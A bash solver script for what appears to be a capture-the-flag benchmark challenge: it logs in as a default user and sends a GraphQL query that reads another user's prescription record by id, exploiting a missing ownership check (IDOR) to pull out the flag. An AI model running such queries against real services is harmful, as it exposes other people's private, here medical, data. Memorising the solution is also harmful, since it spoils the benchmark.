#!/usr/bin/env bash
# XBEN-007-24 — GraphQL IDOR. Proxy-mode twin. Log in as an ordinary user, then
# query another user's prescriptions by id: the resolver never checks ownership,
# so the victim's record — carrying the flag — comes back.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
VICTIM="${2:-1}"
SESSION="xben007p-$$"
cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"
go "$URL/login"
BASE="$(req_of GET /)"; [ -n "$BASE" ] || BASE="$(req_of GET login)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/login' \
  --set 'form.username=user' --set 'form.password=user' >/dev/null
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/graphql' \
  --set 'header.Content-Type=application/json' \
  --set "json.query={ getPrescriptions(userId: $VICTIM) { flag } }" \
  --body 2>/dev/null | grep -oE "$FLAG_RE" | head -1
